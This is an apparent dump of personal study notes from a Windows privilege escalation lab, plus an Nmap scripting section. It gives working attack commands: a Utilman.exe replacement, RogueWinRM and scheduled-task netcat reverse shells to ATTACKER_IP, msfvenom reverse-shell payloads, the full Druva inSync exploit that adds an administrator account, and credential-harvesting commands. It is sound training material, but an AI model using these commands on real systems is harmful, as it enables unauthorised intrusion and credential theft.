<pre><code>C:\\&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                              State\n============================= ======================================== ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Disabled\n</code></pre> <p>We'll abuse <code>utilman.exe</code> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p> <p> </p> <p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p> <p>To replace utilman, we will start by taking ownership of it with the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; takeown /f C:\\Windows\\System32\\Utilman.exe\n\nSUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\".\n</code></pre> <p>Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:</p> <p>Command Prompt</p> <pre><code>C:\\&gt; icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F\nprocessed file: Utilman.exe\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>After this, we will replace utilman.exe with a copy of cmd.exe:</p> <p>Command Prompt</p> <pre><code>C:\\Windows\\System32\\&gt; copy cmd.exe utilman.exe\n        1 file(s) copied.\n</code></pre> <p>To trigger utilman, we will lock our screen from the start button:</p> <p> </p> <p>And finally, proceed to click on the \"Ease of Access\" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:</p> <p> </p>"},{"location":"notes/privilegeescalation/Abusing_dangerous_privileges/#seimpersonate-seassignprimarytoken","title":"SeImpersonate / SeAssignPrimaryToken","text":"<p>These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.</p> <p>Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.</p> <p>Let's assume we have an FTP service running with user <code>ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:</p> <p> </p> <p>There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the <code>ftp</code> user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user <code>ftp</code>. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user <code>ftp</code>, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the <code>ftp</code> user has access.</p> <p>If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:</p> <p> </p> <p>Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user <code>ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.</p> <p>As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.</p> <p>In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called \"iis apppool\\defaultapppool\" for web applications.</p> <p>To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.</p> <p>We will use RogueWinRM exploit to accomplish both conditions.</p> <p>Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:</p> <p><code>http://10.10.173.241/</code></p> <p>We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:</p> <p> </p> <p>To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the <code>C:\\tools\\</code> folder.</p> <p>The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.</p> <p>If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.</p> <p>Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4442\n</code></pre> <p>And then, use our web shell to trigger the RogueWinRM exploit using the following command:</p> <pre><code>c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\"\n</code></pre> <p> </p> <p>Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.</p> <p>The <code>-p</code> parameter specifies the executable to be run by the exploit, which is <code>nc64.exe</code> in this case. The <code>-a</code> parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be <code>-e cmd.exe ATTACKER_IP 4442</code>.</p> <p>If all was correctly set up, you should expect a shell with SYSTEM privileges:</p> <p>Kali Linux</p> <pre><code>user@attackerpc$ nc -lvp 4442\nListening on 0.0.0.0 4442\nConnection received on 10.10.175.90 49755\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nc:\\windows\\system32\\inetsrv&gt;whoami\nnt authority\\system\n</code></pre> <p>Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.</p>"},{"location":"notes/privilegeescalation/Abusing_vulnerable_software/","title":"Abusing vulnerable software","text":""},{"location":"notes/privilegeescalation/Abusing_vulnerable_software/#unpatched-software","title":"Unpatched Software","text":"<p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the\u00a0<code>wmic</code>\u00a0tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):</p> <pre><code>wmic product get name,version,vendor\n</code></pre> <p>Remember that the\u00a0<code>wmic product</code>\u00a0command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.</p> <p>Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like\u00a0exploit-db,\u00a0packet storm\u00a0or plain old\u00a0Google, amongst many others.</p> <p>Using wmic and Google, can you find a known vulnerability on any installed product?</p>"},{"location":"notes/privilegeescalation/Abusing_vulnerable_software/#case-study-druva-insync-663","title":"Case Study: Druva inSync 6.6.3","text":"<p>The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by Matteo Malvica. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by Chris Lyne.</p> <p>The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.</p> <p>In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.</p> <p>The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.</p> <p>A patch was issued, where they decided to check that the executed command started with the string <code>C:\\ProgramData\\Druva\\inSync4\\</code>, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute <code>C:\\Windows\\System32\\cmd.exe</code>, which is not in the allowed path; you could simply ask the server to run <code>C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe</code> and that would bypass the check successfully.</p> <p>To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:</p> <p></p> <p>The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.</p> <p>Initially published by Matteo Malvica here, the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:</p> <pre><code>$ErrorActionPreference = \"Stop\"\n\n$cmd = \"net user pwnd /add\"\n\n$s = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n</code></pre> <p>You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at\u00a0<code>C:\\tools\\Druva_inSync_exploit.txt</code>). Note that the exploit's default payload, specified in the <code>$cmd</code> variable, will create a user named <code>pwnd</code> in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:</p> <pre><code>net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add\n</code></pre> <p>This will create user <code>pwnd</code> with a password of <code>SimplePass123</code> and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user <code>pwnd</code> exists and is part of the administrators' group:</p> <p>Command Prompt</p> <pre><code>PS C:\\&gt; net user pwnd\nUser name                    pwnd\nFull Name\nAccount active               Yes\n[...]\n\nLocal Group Memberships      *Administrators       *Users\nGlobal Group memberships     *None\n</code></pre> <p>As a last step, you can run a command prompt as administrator:</p> <p> </p>"},{"location":"notes/privilegeescalation/Tools_for_winprivesc/","title":"Tools for winprivesc","text":"<p>Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.</p> <p>Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.</p>"},{"location":"notes/privilegeescalation/Tools_for_winprivesc/#winpeas","title":"WinPEAS","text":"<p>WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:</p> <p>Command Prompt</p> <pre><code>       `C:\\&gt; winpeas.exe &gt; outputfile.txt`\n</code></pre> <p>WinPEAS can be downloaded here.  </p>"},{"location":"notes/privilegeescalation/Tools_for_winprivesc/#privesccheck","title":"PrivescCheck","text":"<p>PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.</p> <p>PrivescCheck can be downloaded here.</p> <p>Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the <code>Set-ExecutionPolicy</code> cmdlet as shown below.</p> <p>Powershell</p> <pre><code>       `PS C:\\&gt; Set-ExecutionPolicy Bypass -Scope process -Force PS C:\\&gt; . .\\PrivescCheck.ps1 PS C:\\&gt; Invoke-PrivescCheck`\n</code></pre>"},{"location":"notes/privilegeescalation/Tools_for_winprivesc/#wes-ng-windows-exploit-suggester-next-generation","title":"WES-NG: Windows Exploit Suggester - Next Generation","text":"<p>Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).</p> <p>WES-NG is a Python script that can be found and downloaded here.</p> <p>Once installed, and before using it, type the <code>wes.py --update</code> command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.</p> <p>To use the script, you will need to run the <code>systeminfo</code>\u00a0command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.</p> <p>Once this is done, wes.py can be run as follows;</p> <p>Kali Linux</p> <pre><code>user@kali$ wes.py systeminfo.txt\n</code></pre>"},{"location":"notes/privilegeescalation/Tools_for_winprivesc/#metasploit","title":"Metasploit","text":"<p>If you already have a Meterpreter shell on the target system, you can use the <code>multi/recon/local_exploit_suggester</code> module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/","title":"Windows Privilege Escalation","text":"<p>Simply put, privilege escalation consists of using given access to a host with \"user A\" and leveraging it to gain access to \"user B\" by abusing a weakness in the target system. While we will usually want \"user B\" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.</p> <p>Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:</p> <ul> <li> <p>Misconfigurations on Windows services or scheduled tasks</p> </li> <li> <p>Excessive privileges assigned to our account</p> </li> <li> <p>Vulnerable software</p> </li> <li> <p>Missing Windows security patches</p> </li> </ul> <p>Before jumping into the actual techniques, let's look at the different account types on a Windows system.</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#windows-users","title":"Windows Users","text":"<p>Windows systems mainly\u00a0have\u00a0two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:</p> Administrators These users have the most privileges. They can change any system configuration parameter and access any file in the system. Standard Users These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. <p>Any user with administrative privileges will be part of the\u00a0Administrators\u00a0group. On the other hand, standard users are part of the\u00a0Users\u00a0group.</p> <p>In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:</p> SYSTEM / LocalSystem An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. Local Service Default account used to run Windows services with \"minimum\" privileges. It will use anonymous connections over the network. Network Service Default account used to run Windows services with \"minimum\" privileges. It will use the computer credentials to authenticate through the network. <p>These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.</p> <p>HARVESTING PASSWORD FROM USUAL SPOTS</p> <p>The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#unattended-windows-installations","title":"** Unattended Windows Installations**","text":"<p>When installing Windows on a large number of hosts, administrators\u00a0 may use Windows Deployment Services, which allows for a single operating\u00a0 system image to be deployed to several hosts through the network. These\u00a0 kinds of installations are referred to as unattended installations as\u00a0 they don't require user interaction. Such installations require the use\u00a0 of an administrator account to perform the initial setup, which might\u00a0 end up being stored in the machine in the following locations:</p> <ul> <li> <p>C:\\Unattend.xml</p> </li> <li> <p>C:\\Windows\\Panther\\Unattend.xml</p> </li> <li> <p>C:\\Windows\\Panther\\Unattend\\Unattend.xml</p> </li> <li> <p>C:\\Windows\\system32\\sysprep.inf</p> </li> <li> <p>C:\\Windows\\system32\\sysprep\\sysprep.xml</p> </li> </ul>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#powershell-history","title":"Powershell History","text":"<p>Whenever a user runs a command using Powershell, it gets stored into a\u00a0 file that keeps a memory of past commands. This is useful for repeating\u00a0 commands you have used before quickly. If a user runs a command that\u00a0 includes a password directly as part of the Powershell command line, it\u00a0 can later be retrieved by using the following command from a <code>cmd.exe</code> prompt:</p> <p>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</p> <p>Note: The command above will only work from cmd.exe, as Powershell won't recognize <code>%userprofile%</code> as an environment variable. To read the file from Powershell, you'd have to replace <code>%userprofile%</code> with <code>$Env:userprofile</code>.\u00a0</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#saved-windows-credentials","title":"Saved Windows Credentials","text":"<p>Windows allows us to use other users' credentials. This function also\u00a0 gives the option to save these credentials on the system. The command\u00a0 below will list saved credentials:</p> <p>cmdkey /list</p> <p>While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the\u00a0<code>runas</code>\u00a0command and the\u00a0<code>/savecred</code>\u00a0option, as seen below.</p> <p>runas /savecred /user:admin cmd.exe</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#iis-configuration","title":"IIS Configuration","text":"<p>Internet Information Services (IIS) is the default web server on\u00a0 Windows installations. The configuration of websites on IIS is stored in\u00a0 a file called <code>web.config</code> and can store passwords for\u00a0 databases or configured authentication mechanisms. Depending on the\u00a0 installed version of IIS, we can find web.config in one of the following\u00a0 locations:</p> <ul> <li> <p>C:\\inetpub\\wwwroot\\web.config</p> </li> <li> <p>C:\\Windows[Microsoft.NET](http://Microsoft.NET)\\Framework64\\v4.0.30319\\Config\\web.config</p> </li> </ul> <p>Here is a quick way to find database connection strings on the file:</p> <p>type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#retrieve-credentials-from-software-putty","title":"Retrieve Credentials from Software: PuTTY","text":"<p>PuTTY is an SSH client commonly found on Windows systems. Instead of\u00a0 having to specify a connection's parameters every single time, users can\u00a0 store sessions where the IP, user and other configurations can be\u00a0 stored for later use. While PuTTY won't allow users to store their SSH\u00a0 password, it will store proxy configurations that include cleartext\u00a0 authentication credentials.</p> <p>To retrieve the stored proxy credentials, you can search under the\u00a0 following registry key for ProxyPassword with the following command:</p> <p>reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s</p> <p>Note: Simon Tatham is the creator of PuTTY (and his name is\u00a0 part of the path), not the username for which we are retrieving the\u00a0 password. The stored proxy username should also be visible after running\u00a0 the command above.</p> <p>Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.</p> <p>OTHER OPTIONS MISCONFIGURATIONS</p> <p>Privilege escalation is\u00a0 not always a challenge. Some misconfigurations can allow you to obtain\u00a0 higher privileged user access and, in some cases, even administrator\u00a0 access. It would help if you considered these to belong more to the\u00a0 realm of CTF events rather than scenarios you will encounter during real\u00a0 penetration testing engagements. However, if none of the previously\u00a0 mentioned methods works, you can always go back to these.</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>Looking into scheduled tasks on the target system, you may see a\u00a0 scheduled task that either lost its binary or it's using a binary you\u00a0 can modify.</p> <p>Scheduled tasks can be listed from the command line using the\u00a0<code>schtasks</code>\u00a0command\u00a0 without any options. To retrieve detailed information about any of the\u00a0 services, you can use a command like the following one:</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <p>C:&gt; schtasks /query /tn vulntask /fo list /v</p> <p>Folder: \\</p> <p>HostName: THM-PC1</p> <p>TaskName: \\vulntask</p> <p>Task To Run: C:\\tasks\\schtask.bat</p> <p>Run As User: taskusr1</p> <p>You will get lots of information about the task, but what matters for\u00a0 us is the \"Task to Run\" parameter which indicates what gets executed by\u00a0 the scheduled task, and the \"Run As User\" parameter, which shows the\u00a0 user that will be used to execute the task.</p> <p>If our current user can modify or overwrite the \"Task to Run\"\u00a0 executable, we can control what gets executed by the taskusr1 user,\u00a0 resulting in a simple privilege escalation. To check the file\u00a0 permissions on the executable, we use <code>icacls</code>:</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <p>C:&gt; icacls c:\\tasks\\schtask.bat</p> <p>c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)</p> <p>BUILTIN\\Administrators:(I)(F)</p> <p>BUILTIN\\Users:(I)(F)</p> <p>As can be seen in the result, the BUILTIN\\Users\u00a0 group has full access (F) over the task's binary. This means we can\u00a0 modify the .bat file and insert any payload we like. For your\u00a0 convenience, <code>nc64.exe</code> can be found on <code>C:\\tools</code>. Let's change the bat file to spawn a reverse shell:</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <p>C:&gt; echo c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.bat</p> <p>We then start a listener on the attacker machine on the same port we indicated on our reverse shell:</p> <p>nc -lvp 4444</p> <p>The next time the scheduled task runs, you should receive the reverse\u00a0 shell with taskusr1 privileges. While you probably wouldn't be able to\u00a0 start the task in a real scenario and would have to wait for the\u00a0 scheduled task to trigger, we have provided your user with permissions\u00a0 to start the task manually to save you some time. We can run the task\u00a0 with the following command:</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <p>C:&gt; schtasks /run /tn vulntask</p> <p>And you will receive the reverse shell with taskusr1 privileges as expected:</p> <p>Kali Linux\u00a0 \u00a0 \u00a0 \u00a0</p> <p>user@attackerpc$ nc -lvp 4444</p> <p>Listening on 0.0.0.0 4444</p> <p>Connection received on 10.10.175.90 50649</p> <p>Microsoft Windows [Version 10.0.17763.1821]</p> <p>(c) 2018 Microsoft Corporation. All rights reserved.</p> <p>C:\\Windows\\system32&gt;whoami</p> <p>wprivesc1\\taskusr1</p> <p>Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p>Windows installer files (also known as .msi files) are used to\u00a0 install applications on the system. They usually run with the privilege\u00a0 level of the user that starts it. However, these can be configured to\u00a0 run with higher privileges from any user account (even unprivileged\u00a0 ones). This could potentially allow us to generate a malicious MSI file\u00a0 that would run with admin privileges.</p> <p>Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.</p> <p>This method requires two registry values to be set. You can query these from the command line using the commands below.</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <p>C:&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</p> <p>C:&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</p> <p>To be able to exploit this vulnerability, both should be set.\u00a0 Otherwise, exploitation will not be possible. If these are set, you can\u00a0 generate a malicious .msi file using\u00a0<code>msfvenom</code>, as seen below:</p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.123.240 LPORT=LOCAL_PORT -f msi -o malicious.msi\n</code></pre> <p>As this is a reverse shell, you should also run the Metasploit\u00a0 Handler module configured accordingly. Once you have transferred the\u00a0 file you have created, you can run the installer with the command below\u00a0 and receive the reverse shell:</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p> <pre><code>C:\\&gt; msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi\n</code></pre>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#windows-services","title":"Windows Services","text":"<p>Windows services are managed by the Service Control Manager\u00a0 (SCM). The SCM is a process in charge of managing the state of services\u00a0 as needed, checking the current status of any given service and\u00a0 generally providing a way to configure services.</p> <p>Each service on a Windows machine will have an associated executable\u00a0 which will be run by the SCM whenever a service is started. It is\u00a0 important to note that service executables implement special functions\u00a0 to be able to communicate with the SCM, and therefore not any executable\u00a0 can be started as a service successfully. Each service also specifies\u00a0 the user account under which the service will run.</p> <p>To better understand the structure of a service, let's check the apphostsvc service configuration with the <code>sc qc</code> command:</p> <p>Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.</p> <p>Services have a Discretionary Access Control List (DACL), which\u00a0 indicates who has permission to start, stop, pause, query status, query\u00a0 configuration, or reconfigure the service, amongst other privileges. The\u00a0 DACL can be seen from Process Hacker (available on your machine's\u00a0 desktop): A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.</p>"},{"location":"notes/privilegeescalation/Windows%20Privilege%20Escalation/#insecure-service-permissions","title":"Insecure Service Permissions","text":"<p>You might still have a slight chance of taking advantage of a service\u00a0 if the service's executable DACL is well configured, and the service's\u00a0 binary path is rightly quoted. Should the service DACL (not the\u00a0 service's executable DACL) allow you to modify the configuration of a\u00a0 service, you will be able to reconfigure the service. This will allow\u00a0 you to point to any executable you need and run it with any account you\u00a0 prefer, including SYSTEM itself.</p> <p>To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at <code>C:\\\\tools</code>. The command to check for the thmservice service DACL is:</p> <p>Here we can see that the <code>BUILTIN\\\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.</p> <p>Before changing the service, let's build another exe-service reverse\u00a0 shell and start a listener for it on the attacker's machine:</p> <pre><code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe\n</code></pre> <pre><code>user@attackerpc$ nc -lvp 4447\n</code></pre> <pre><code>C:\\&gt; icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F\n</code></pre> <p>To change the service's associated executable and account, we can use\u00a0 the following command (mind the spaces after the equal signs when using\u00a0 sc.exe):</p> <p>Command Prompt\u00a0 \u00a0 \u00a0 \u00a0</p>"},{"location":"notes/tools/Nmap/","title":"Nmap","text":""},{"location":"notes/tools/Nmap/#nmap-scripting-engine","title":"NMAP scripting engine","text":"<p>The\u00a0Nmap\u00a0Scripting\u00a0Engine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the\u00a0Lua\u00a0programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaissance, however, it is well worth bearing in mind how extensive the script library is.</p> <p>There are many categories available. Some useful categories include:</p> <ul> <li> <p><code>safe</code>:- Won't affect the target</p> </li> <li> <p><code>intrusive</code>:- Not safe: likely to affect the target</p> </li> <li> <p><code>vuln</code>:- Scan for vulnerabilities</p> </li> <li> <p><code>exploit</code>:- Attempt to exploit a vulnerability</p> </li> <li> <p><code>auth</code>:- Attempt to bypass authentication for running services (e.g. Log into an\u00a0FTP\u00a0server anonymously)</p> </li> <li> <p><code>brute</code>:- Attempt to bruteforce credentials for running services</p> </li> <li> <p><code>discovery</code>:- Attempt to query running services for further information about the network (e.g. query an SNMP server).</p> </li> </ul> <p>working with nmap scripting engine ( nse )</p> <p>we looked very briefly at the\u00a0<code>--script</code>\u00a0switch for activating NSE scripts from the\u00a0<code>vuln</code>\u00a0category using\u00a0<code>--script=vuln</code>. It should come as no surprise that the other categories work in exactly the same way. If the command\u00a0<code>--script=safe</code>\u00a0is run, then any applicable safe scripts will be run against the target (Note: only scripts which target an active service will be activated).</p> <p>To run a specific script, we would use\u00a0<code>--script=&lt;script-name&gt;</code>\u00a0\u00a0, e.g.\u00a0<code>--script=http-fileupload-exploiter</code>.</p> <p>Multiple scripts can be run simultaneously in this fashion by separating them by a comma. For example:\u00a0<code>--script=smb-enum-users,smb-enum-shares</code>.</p> <p>Some scripts require arguments (for example, credentials, if they're exploiting an authenticated vulnerability). These can be given with the\u00a0<code>--script-args</code>Nmap switch. An example of this would be with the\u00a0<code>http-put</code>\u00a0script (used to upload files using the PUT method). This takes two arguments: the URL to upload the file to, and the file's location on disk.\u00a0 For example:</p> <p><code>nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'</code></p> <p>Note that the arguments are separated by commas, and connected to the corresponding script with periods (i.e.\u00a0\u00a0<code>&lt;script-name&gt;.&lt;argument&gt;</code>).</p> <p>A full list of scripts and their corresponding arguments (along with example use cases) can be found\u00a0here.</p> <p>Nmap scripts come with built-in help menus, which can be accessed using\u00a0<code>nmap --script-help &lt;script-name&gt;</code>. This tends not to be as extensive as in the link given above, however, it can still be useful when working locally.</p>"},{"location":"notes/tools/Nmap/#how-to-find-the-nse-nmap-scripts","title":"HOW TO FIND THE NSE ( NMAP SCRIPTS)","text":"<p>Ok, so we know how to use the scripts in Nmap, but we don't yet know how to\u00a0find\u00a0these scripts.</p> <p>We have two options for this, which should ideally be used in conjunction with each other. The first is the page on the\u00a0Nmap website\u00a0(mentioned in the previous task) which contains a list of all official scripts. The second is the local storage on your attacking machine. Nmap stores its scripts on\u00a0Linux\u00a0at\u00a0<code>/usr/share/nmap/scripts</code> </p> <p>types of scan learned on nmap</p> <ol> <li> <p>tcp connect 